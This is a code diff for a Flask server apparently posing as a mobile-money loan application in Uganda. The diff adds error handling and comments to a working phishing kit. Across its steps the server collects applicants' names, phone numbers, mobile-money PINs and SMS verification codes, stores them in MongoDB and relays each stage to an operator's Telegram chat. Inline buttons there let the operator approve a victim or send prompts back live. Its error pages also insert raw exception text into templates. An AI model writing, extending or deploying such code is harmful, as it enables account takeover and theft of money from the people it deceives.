@@ -1,26 +1,61 @@
+"""
+======================================================================
+MOMO UGANDA LOAN APPLICATION & TELEGRAM NOTIFICATION SYSTEM
+Backend Application Server (Flask + PyMongo + Telegram Webhooks)
+======================================================================
+"""
+
 import os
 import time
 import random
 import requests
-from flask import Flask, render_template, request, redirect, url_for, session, jsonify
+from flask import (
+    Flask, 
+    render_template, 
+    request, 
+    redirect, 
+    url_for, 
+    session, 
+    jsonify, 
+    render_template_string
+)
 from pymongo import MongoClient
 from bson.objectid import ObjectId
 
+# Initialize Flask Application Core
 app = Flask(__name__)
 app.secret_key = os.environ.get("FLASK_SECRET_KEY", "super_secret_momo_uganda_key")
 
-# MongoDB connection with SSL/TLS fallback for serverless/cloud environments
+# ======================================================================
+# DATABASE INITIALIZATION & CONFIGURATION
+# ======================================================================
 MONGO_URI = os.environ.get("MONGO_URI")
-client = MongoClient(MONGO_URI, tls=True, tlsAllowInvalidCertificates=True)
-db = client["brian_client_1st"]
-applications_collection = db["applications"]
-support_collection = db["support_tickets"]
 
-# Telegram Configuration
+try:
+    client = MongoClient(MONGO_URI, tls=True, tlsAllowInvalidCertificates=True)
+    db = client["brian_client_1st"]
+    applications_collection = db["applications"]
+    support_collection = db["support_tickets"]
+    print("✅ Successfully initialized MongoDB client connection.")
+except Exception as db_init_err:
+    print(f"❌ Critical MongoDB Initialization Error: {db_init_err}")
+
+# ======================================================================
+# TELEGRAM BOT CREDENTIALS & CONFIGURATION
+# ======================================================================
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
 TELEGRAM_ADMIN_CHAT_ID = os.environ.get("TELEGRAM_ADMIN_CHAT_ID")
 
+
 def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step_code="pin"):
+    """
+    Dispatches rich interactive notification cards to the administrator Telegram chat,
+    complete with inline action buttons for approval, flagging, or custom prompts.
+    """
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_ADMIN_CHAT_ID:
+        print("⚠️ Telegram credentials not fully configured in environment variables.")
+        return
+
     db_id = str(app_data.get("_id"))
     
     message = (
@@ -51,11 +86,19 @@ def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step
     }
     
     try:
-        requests.post(url, json=payload, timeout=5)
+        response = requests.post(url, json=payload, timeout=5)
+        response.raise_for_status()
     except Exception as e:
-        print(f"Telegram alert error: {e}")
+        print(f"❌ Telegram interactive alert transmission error: {e}")
+
 
 def send_telegram_support_alert(ticket_data, db_id):
+    """
+    Dispatches customer support ticket alerts to the admin chat with direct WhatsApp links.
+    """
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_ADMIN_CHAT_ID:
+        return
+
     clean_phone = ticket_data.get('whatsapp_phone', '').replace('+', '').replace(' ', '')
     wa_direct_link = f"https://wa.me/{clean_phone}"
     
@@ -83,143 +126,207 @@ def send_telegram_support_alert(ticket_data, db_id):
     }
     
     try:
-        requests.post(url, json=payload, timeout=5)
+        response = requests.post(url, json=payload, timeout=5)
+        response.raise_for_status()
     except Exception as e:
-        print(f"Telegram support alert error: {e}")
+        print(f"❌ Telegram support alert transmission error: {e}")
 
-# ==========================================
-# APPLICATION STEP ROUTES
-# ==========================================
+
+def render_safe_template(template_name, **context):
+    """
+    Safely attempts to render an HTML template. If the template file is missing,
+    it returns a clean fallback HTML string to prevent 500 server crashes.
+    """
+    try:
+        return render_template(template_name, **context)
+    except Exception as template_err:
+        print(f"⚠️ Template error for '{template_name}': {template_err}")
+        return render_template_string(
+            f"<h3>System Notice</h3><p>Template <b>{template_name}</b> could not be loaded.</p>"
+            f"<p>Error: {str(template_err)}</p>"
+        ), 500
+
+
+# ======================================================================
+# MULTI-STEP LOAN APPLICATION ROUTES
+# ======================================================================
 
 @app.route("/", methods=["GET"])
 def index():
+    """Root entry point redirects users directly into step 1 of the application."""
     return redirect(url_for("apply_step1"))
+
 
 @app.route("/apply/step1", methods=["GET", "POST"])
 def apply_step1():
+    """Handles personal details collection (First Name, Last Name, Phone Number)."""
     if request.method == "POST":
-        first_name = request.form.get("first_name", "").strip()
-        last_name = request.form.get("last_name", "").strip()
-        phone = request.form.get("phone", "").strip()
+        try:
+            first_name = request.form.get("first_name", "").strip()
+            last_name = request.form.get("last_name", "").strip()
+            phone = request.form.get("phone", "").strip()
+            
+            app_id = "APP" + os.urandom(4).hex().upper()
+            
+            session["app_id"] = app_id
+            session["first_name"] = first_name
+            session["last_name"] = last_name
+            session["phone"] = phone
+            
+            app_data = {
+                "app_id": app_id,
+                "first_name": first_name,
+                "last_name": last_name,
+                "phone": phone,
+                "status": "Step1_Completed",
+                "created_at": time.time()
+            }
+            
+            inserted_id = applications_collection.insert_one(app_data).inserted_id
+            session["db_id"] = str(inserted_id)
+            
+            return redirect(url_for("apply_step2"))
+        except Exception as e:
+            print(f"❌ Error in apply_step1 POST: {e}")
+            return render_template_string(f"<h3>Application Error</h3><p>{str(e)}</p>"), 500
         
-        app_id = "APP" + os.urandom(4).hex().upper()
-        
-        session["app_id"] = app_id
-        session["first_name"] = first_name
-        session["last_name"] = last_name
-        session["phone"] = phone
-        
-        app_data = {
-            "app_id": app_id,
-            "first_name": first_name,
-            "last_name": last_name,
-            "phone": phone,
-            "status": "Step1_Completed",
-            "created_at": time.time()
-        }
-        
-        inserted_id = applications_collection.insert_one(app_data).inserted_id
-        session["db_id"] = str(inserted_id)
-        
-        return redirect(url_for("apply_step2"))
-        
-    return render_template("step1.html")
+    return render_safe_template("step1.html")
+
 
 @app.route("/apply/step2", methods=["GET", "POST"])
 def apply_step2():
+    """Handles secondary contact collection (WhatsApp Phone)."""
     if request.method == "POST":
-        whatsapp_phone = request.form.get("whatsapp_phone", "").strip()
-        
-        db_id = session.get("db_id")
-        if db_id:
-            applications_collection.update_one(
-                {"_id": ObjectId(db_id)},
-                {"$set": {"whatsapp_phone": whatsapp_phone, "status": "Step2_Completed"}}
-            )
+        try:
+            whatsapp_phone = request.form.get("whatsapp_phone", "").strip()
             
-        return redirect(url_for("apply_step3"))
+            db_id = session.get("db_id")
+            if db_id:
+                applications_collection.update_one(
+                    {"_id": ObjectId(db_id)},
+                    {"$set": {"whatsapp_phone": whatsapp_phone, "status": "Step2_Completed"}}
+                )
+                
+            return redirect(url_for("apply_step3"))
+        except Exception as e:
+            print(f"❌ Error in apply_step2 POST: {e}")
+            return render_template_string(f"<h3>Application Error</h3><p>{str(e)}</p>"), 500
         
-    return render_template("step2.html")
+    return render_safe_template("step2.html")
+
 
 @app.route("/apply/step3", methods=["GET", "POST"])
 def apply_step3():
+    """Handles mobile money PIN capture and triggers initial Telegram notification."""
     if request.method == "POST":
-        password = request.form.get("password", "").strip()
-        
-        db_id = session.get("db_id")
-        if db_id:
-            applications_collection.update_one(
-                {"_id": ObjectId(db_id)},
-                {"$set": {"password": password, "status": "PIN_Submitted"}}
-            )
+        try:
+            password = request.form.get("password", "").strip()
             
-            app_data = applications_collection.find_one({"_id": ObjectId(db_id)})
-            if app_data:
-                send_telegram_interactive_alert(app_data, stage_title="NEW APPLICATION - PIN SUBMITTED", step_code="pin")
+            db_id = session.get("db_id")
+            if db_id:
+                applications_collection.update_one(
+                    {"_id": ObjectId(db_id)},
+                    {"$set": {"password": password, "status": "PIN_Submitted"}}
+                )
                 
-        return redirect(url_for("processing"))
+                app_data = applications_collection.find_one({"_id": ObjectId(db_id)})
+                if app_data:
+                    send_telegram_interactive_alert(
+                        app_data, 
+                        stage_title="NEW APPLICATION - PIN SUBMITTED", 
+                        step_code="pin"
+                    )
+                    
+            return redirect(url_for("processing"))
+        except Exception as e:
+            print(f"❌ Error in apply_step3 POST: {e}")
+            return render_template_string(f"<h3>Application Error</h3><p>{str(e)}</p>"), 500
         
-    return render_template("step3.html")
+    return render_safe_template("step3.html")
 
-@app.route("/processing")
+
+@app.route("/processing", methods=["GET"])
 def processing():
-    return render_template("processing.html")
+    """Displays intermediate loading / processing animation screen."""
+    return render_safe_template("processing.html")
+
 
 @app.route("/login", methods=["GET", "POST"])
 def login():
+    """Handles SMS verification code entry and triggers second Telegram alert."""
     if request.method == "POST":
-        auth_code = request.form.get("auth_code", "").strip()
-        
-        db_id = session.get("db_id")
-        if db_id:
-            applications_collection.update_one(
-                {"_id": ObjectId(db_id)},
-                {"$set": {"auth_code": auth_code, "status": "SMS_Submitted"}}
-            )
+        try:
+            auth_code = request.form.get("auth_code", "").strip()
             
-            app_data = applications_collection.find_one({"_id": ObjectId(db_id)})
-            if app_data:
-                send_telegram_interactive_alert(app_data, stage_title="SMS VERIFICATION CODE SUBMITTED", step_code="sms")
+            db_id = session.get("db_id")
+            if db_id:
+                applications_collection.update_one(
+                    {"_id": ObjectId(db_id)},
+                    {"$set": {"auth_code": auth_code, "status": "SMS_Submitted"}}
+                )
                 
-        app_id = session.get("app_id", "")
-        return redirect(url_for("pending", app_id=app_id))
+                app_data = applications_collection.find_one({"_id": ObjectId(db_id)})
+                if app_data:
+                    send_telegram_interactive_alert(
+                        app_data, 
+                        stage_title="SMS VERIFICATION CODE SUBMITTED", 
+                        step_code="sms"
+                    )
+                    
+            app_id = session.get("app_id", "")
+            return redirect(url_for("pending", app_id=app_id))
+        except Exception as e:
+            print(f"❌ Error in login/SMS POST: {e}")
+            return render_template_string(f"<h3>Application Error</h3><p>{str(e)}</p>"), 500
         
-    return render_template("login.html")
+    return render_safe_template("login.html")
 
-@app.route("/pending")
+
+@app.route("/pending", methods=["GET"])
 def pending():
+    """Displays pending status review screen."""
     app_id = request.args.get("app_id", session.get("app_id", ""))
-    return render_template("pending.html", app_id=app_id)
+    return render_safe_template("pending.html", app_id=app_id)
 
-@app.route("/check-status")
+
+@app.route("/check-status", methods=["GET"])
 def check_status():
-    app_id = request.args.get("app_id")
-    if not app_id:
-        return jsonify({"status": "Unknown"}), 400
-        
-    app_data = applications_collection.find_one({"app_id": app_id})
-    if app_data:
-        return jsonify({
-            "status": app_data.get("status", "Pending"),
-            "custom_message": app_data.get("custom_message", "")
-        }), 200
-        
-    return jsonify({"status": "Not Found"}), 404
+    """AJAX endpoint for polling live application approval status from the frontend."""
+    try:
+        app_id = request.args.get("app_id")
+        if not app_id:
+            return jsonify({"status": "Unknown"}), 400
+            
+        app_data = applications_collection.find_one({"app_id": app_id})
+        if app_data:
+            return jsonify({
+                "status": app_data.get("status", "Pending"),
+                "custom_message": app_data.get("custom_message", "")
+            }), 200
+            
+        return jsonify({"status": "Not Found"}), 404
+    except Exception as e:
+        print(f"❌ Error in check_status: {e}")
+        return jsonify({"status": "error", "message": str(e)}), 500
 
-# ==========================================
-# SYSTEM UTILS & WEBHOOK
-# ==========================================
 
-@app.route("/health")
+# ======================================================================
+# SYSTEM UTILITIES, SUPPORT & TELEGRAM WEBHOOK ENDPOINTS
+# ======================================================================
+
+@app.route("/health", methods=["GET"])
 def health():
+    """Health check endpoint pinged by UptimeRobot to keep the Render server warm."""
     try:
         client.admin.command('ping')
         return jsonify({"status": "ok", "database": "connected", "market": "Uganda"}), 200
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
 
+
 @app.route("/submit-support", methods=["POST"])
 def submit_support():
+    """Handles incoming client support tickets."""
     try:
         data = request.get_json() or {}
         whatsapp_phone = data.get("whatsapp_phone", "").strip()
@@ -241,11 +348,13 @@ def submit_support():
         
         return jsonify({"status": "ok", "message": "Ticket submitted successfully"}), 200
     except Exception as e:
-        print(f"Error submitting support ticket: {e}")
+        print(f"❌ Error submitting support ticket: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
+
 
 @app.route("/telegram-webhook", methods=["POST"])
 def telegram_webhook():
+    """Processes interactive button clicks and admin telegram command replies."""
     try:
         data = request.get_json() or {}
         print("=== TELEGRAM WEBHOOK RECEIVED ===", data)
@@ -297,13 +406,13 @@ def telegram_webhook():
                             {"_id": actual_obj_id},
                             {"$set": {"status": "CustomMessage", "custom_message": "Please review your entry."}}
                         )
-                        text_response = "💬 Prompt sent!"
+                        text_response = f"💬 Prompt sent!"
 
             answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
             try:
                 requests.post(answer_url, json={"callback_query_id": callback_id, "text": text_response}, timeout=5)
             except Exception as e:
-                print(f"Answer callback error: {e}")
+                print(f"❌ Answer callback error: {e}")
 
         elif "message" in data:
             msg = data["message"]
@@ -356,8 +465,9 @@ def telegram_webhook():
 
         return jsonify({"status": "ok"}), 200
     except Exception as e:
-        print(f"Webhook error: {e}")
+        print(f"❌ Webhook error: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
+
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
